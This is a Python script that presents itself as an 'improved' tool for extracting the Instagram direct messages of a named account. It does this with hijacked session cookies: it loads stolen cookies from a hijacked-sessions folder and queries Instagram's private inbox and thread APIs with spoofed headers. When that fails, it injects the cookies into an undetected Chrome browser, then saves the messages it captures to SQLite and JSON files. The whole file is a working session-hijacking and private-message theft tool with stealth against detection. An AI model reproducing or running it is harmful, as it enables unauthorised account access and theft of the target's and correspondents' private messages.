# -*- coding: utf-8 -*-
# pylint: disable=all
# flake8: noqa
# type: ignore
# mypy: ignore-errors
#!/usr/bin/env python3
"""
💎 IMPROVED ALX.TRADING DM EXTRACTOR
Using hijacked sessions with enhanced stealth
พอร์ทสำหรับ alx.trading DM extraction ที่ใช้ hijacked sessions 💖
"""

import json
import os
import time
import sqlite3
import random
import requests
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
try:
    import undetected_chromedriver as uc
except ImportError:
    print("⚠️ undetected_chromedriver not available")
    uc = None

class ImprovedAlxExtractor:
    def __init__(self):
        self.target = "alx.trading"
        self.output_dir = "/workspaces/sugarglitch-realops/data/improved_extraction"
        os.makedirs(self.output_dir, exist_ok=True)

        # Load the best hijacked session
        self.session_data = self.load_best_hijacked_session()
        self.headers = self.build_stealth_headers()

        # Results storage
        self.threads = []
        self.messages = []

        print("💎" * 50)
        print("💖 IMPROVED ALX.TRADING DM EXTRACTOR")
        print("💎" * 50)
        print(f"🎯 Target: @{self.target}")

    def load_best_hijacked_session(self):
        """Load the freshest hijacked session available"""
        hijacked_dir = "/workspaces/sugarglitch-realops/hijacked_sessions"

        # Find all fresh hijacked sessions
        fresh_sessions = []
        for file in os.listdir(hijacked_dir):
            if file.startswith("fresh_hijacked_session_"):
                try:
                    with open(os.path.join(hijacked_dir, file), 'r') as f:
                        session = json.load(f)
                        fresh_sessions.append((file, session))
                except Exception:
                    continue

        if not fresh_sessions:
            print("⚠️ No fresh hijacked sessions found")
            return None

        # Sort by timestamp and get the newest
        fresh_sessions.sort(key=lambda x: x[1].get('session_info', {}).get('created_timestamp', 0), reverse=True)
        best_session = fresh_sessions[0][1]

        print(f"✅ Loaded hijacked session: {fresh_sessions[0][0]}")
        return best_session

    def build_stealth_headers(self):
        """Build realistic headers for API requests"""
        return {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        }

    def create_session_with_cookies(self):
        """Create requests session with hijacked cookies"""
        session = requests.Session()
        session.headers.update(self.headers)

        if not self.session_data or 'cookies' not in self.session_data:
            print("❌ No valid session data")
            return session

        # Add cookies to session
        for cookie in self.session_data['cookies']:
            session.cookies.set(
                cookie['name'],
                cookie['value'],
                domain=cookie.get('domain', '.instagram.com'),
                path=cookie.get('path', '/')
            )

        print("✅ Session configured with hijacked cookies")
        return session

    def extract_with_api(self):
        """Extract DMs using Instagram API with hijacked session"""
        print("\n🌐 METHOD: Enhanced API with Hijacked Session")
        print("=" * 50)

        session = self.create_session_with_cookies()

        # Test endpoints with progressive stealth
        endpoints = [
            f"https://www.instagram.com/api/v1/users/web_profile_info/?username={self.target}",
            "https://www.instagram.com/api/v1/direct_v2/inbox/",
            f"https://i.instagram.com/api/v1/users/{self.target}/info/",
            "https://i.instagram.com/api/v1/direct_v2/threads/",
        ]

        for endpoint in endpoints:
            try:
                # Add progressive delays to avoid rate limits
                time.sleep(random.uniform(2, 5))

                print(f"🔍 Testing: {endpoint}")
                response = session.get(endpoint, timeout=30)

                print(f"   Status: {response.status_code}")

                if response.status_code == 200:
                    data = response.json()
                    print(f"   ✅ Success! Data keys: {list(data.keys())}")

                    # Process the response based on endpoint
                    if 'web_profile_info' in endpoint:
                        self.process_profile_data(data)
                    elif 'inbox' in endpoint or 'threads' in endpoint:
                        self.process_dm_data(data)

                elif response.status_code == 429:
                    print("   ⚠️  Rate limited! Waiting...")
                    time.sleep(random.uniform(10, 20))
                else:
                    print(f"   ❌ Error: {response.status_code}")

            except Exception as e:
                print(f"   ❌ Exception: {str(e)}")

    def process_profile_data(self, data):
        """Process profile information"""
        try:
            if 'data' in data and 'user' in data['data']:
                user = data['data']['user']
                print(f"✅ Profile found: {user.get('username', 'Unknown')}")
                print(f"   Full name: {user.get('full_name', 'N/A')}")
                print(f"   Followers: {user.get('edge_followed_by', {}).get('count', 'N/A')}")

                # Save profile data
                profile_file = os.path.join(self.output_dir, f"profile_{self.target}.json")
                with open(profile_file, 'w') as f:
                    json.dump(data, f, indent=2)

        except Exception as e:
            print(f"❌ Error processing profile: {e}")

    def process_dm_data(self, data):
        """Process DM data"""
        try:
            print(f"✅ DM data received! Keys: {list(data.keys())}")

            # Look for common DM data structures
            if 'inbox' in data:
                inbox = data['inbox']
                print(f"   Inbox threads: {len(inbox.get('threads', []))}")

                for thread in inbox.get('threads', []):
                    self.process_thread(thread)

            # Save raw DM data
            dm_file = os.path.join(self.output_dir, f"dms_{self.target}_{int(time.time())}.json")
            with open(dm_file, 'w') as f:
                json.dump(data, f, indent=2)

        except Exception as e:
            print(f"❌ Error processing DMs: {e}")

    def process_thread(self, thread):
        """Process individual DM thread"""
        try:
            thread_id = thread.get('thread_id', 'unknown')
            users = thread.get('users', [])
            messages = thread.get('items', [])

            print(f"   📧 Thread {thread_id}: {len(messages)} messages")

            # Check if this thread involves our target
            target_in_thread = any(user.get('username') == self.target for user in users)

            if target_in_thread:
                print(f"   ✅ Target found in thread!")
                self.threads.append(thread)

                for message in messages:
                    self.process_message(message, thread_id)

        except Exception as e:
            print(f"❌ Error processing thread: {e}")

    def process_message(self, message, thread_id):
        """Process individual message"""
        try:
            sender_id = message.get('user_id')
            text = message.get('text', '')
            timestamp = message.get('timestamp')

            if text:  # Only process messages with text
                self.messages.append({
                    'thread_id': thread_id,
                    'sender_id': sender_id,
                    'text': text,
                    'timestamp': timestamp,
                    'extracted_at': datetime.now().isoformat()
                })

        except Exception as e:
            print(f"❌ Error processing message: {e}")

    def extract_with_selenium(self):
        """Fallback: Extract using Selenium browser automation"""
        print("\n🤖 METHOD: Selenium Browser Automation")
        print("=" * 50)

        try:
            # Try undetected chrome first
            if uc:
                options = uc.ChromeOptions()
                options.add_argument('--no-sandbox')
                options.add_argument('--disable-dev-shm-usage')
                options.add_argument('--disable-gpu')
                options.add_argument('--window-size=1920,1080')

                driver = uc.Chrome(options=options)
            else:
                # Fallback to regular chrome
                options = Options()
                options.add_argument('--no-sandbox')
                options.add_argument('--disable-dev-shm-usage')
                options.add_argument('--disable-gpu')

                driver = webdriver.Chrome(options=options)

            # Navigate to Instagram
            driver.get("https://www.instagram.com")
            time.sleep(3)

            # Inject hijacked cookies
            if self.session_data and 'cookies' in self.session_data:
                for cookie in self.session_data['cookies']:
                    try:
                        driver.add_cookie({
                            'name': cookie['name'],
                            'value': cookie['value'],
                            'domain': cookie.get('domain', '.instagram.com'),
                            'path': cookie.get('path', '/')
                        })
                    except Exception:
                        continue

                print("✅ Cookies injected")

            # Navigate to target profile
            driver.get(f"https://www.instagram.com/{self.target}/")
            time.sleep(5)

            # Try to access DMs
            driver.get("https://www.instagram.com/direct/inbox/")
            time.sleep(5)

            # Look for message threads
            try:
                threads = driver.find_elements(By.CSS_SELECTOR, "[role='listitem']")
                print(f"✅ Found {len(threads)} potential threads")

                for i, thread in enumerate(threads[:5]):  # Check first 5 threads
                    try:
                        thread.click()
                        time.sleep(2)

                        # Extract messages from this thread
                        messages = driver.find_elements(By.CSS_SELECTOR, "[data-testid='message-text']")
                        print(f"   Thread {i+1}: {len(messages)} messages")

                        time.sleep(1)

                    except Exception:
                        continue

            except Exception as e:
                print(f"❌ Error accessing threads: {e}")

            driver.quit()

        except Exception as e:
            print(f"❌ Selenium error: {e}")

    def save_results(self):
        """Save extraction results"""
        timestamp = int(time.time())

        # Save to database
        db_path = os.path.join(self.output_dir, f"alx_dms_{timestamp}.db")

        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()

            # Create tables
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS threads (
                    id INTEGER PRIMARY KEY,
                    thread_id TEXT,
                    data TEXT,
                    extracted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')

            cursor.execute('''
                CREATE TABLE IF NOT EXISTS messages (
                    id INTEGER PRIMARY KEY,
                    thread_id TEXT,
                    sender_id TEXT,
                    text TEXT,
                    timestamp TEXT,
                    extracted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')

            # Insert data
            for thread in self.threads:
                cursor.execute(
                    "INSERT INTO threads (thread_id, data) VALUES (?, ?)",
                    (thread.get('thread_id', 'unknown'), json.dumps(thread))
                )

            for message in self.messages:
                cursor.execute(
                    "INSERT INTO messages (thread_id, sender_id, text, timestamp) VALUES (?, ?, ?, ?)",
                    (message['thread_id'], message['sender_id'], message['text'], message['timestamp'])
                )

            conn.commit()
            conn.close()

            print(f"✅ Database saved: {db_path}")

        except Exception as e:
            print(f"❌ Database error: {e}")

        # Save JSON report
        report = {
            "target": self.target,
            "extraction_time": datetime.now().isoformat(),
            "threads_found": len(self.threads),
            "messages_found": len(self.messages),
            "threads": self.threads,
            "messages": self.messages
        }

        report_file = os.path.join(self.output_dir, f"extraction_report_{timestamp}.json")
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)

        print(f"✅ Report saved: {report_file}")

    def run(self):
        """Run the complete extraction process"""
        print(f"🚀 Starting improved extraction for @{self.target}")

        # Method 1: API extraction with hijacked session
        self.extract_with_api()

        # Method 2: Selenium browser automation (fallback)
        if not self.messages:
            print("\n🔄 No messages found via API, trying Selenium...")
            self.extract_with_selenium()

        # Save results
        self.save_results()

        # Final report
        print("\n💎 EXTRACTION COMPLETE 💎")
        print("=" * 50)
        print(f"🎯 Target: @{self.target}")
        print(f"📧 Threads: {len(self.threads)}")
        print(f"💬 Messages: {len(self.messages)}")
        print(f"📁 Output: {self.output_dir}")

        if self.messages:
            print("✅ SUCCESS: Messages extracted!")
        else:
            print("⚠️  No messages extracted - target may not have DMs or session needs refresh")

if __name__ == "__main__":
    extractor = ImprovedAlxExtractor()
    extractor.run()
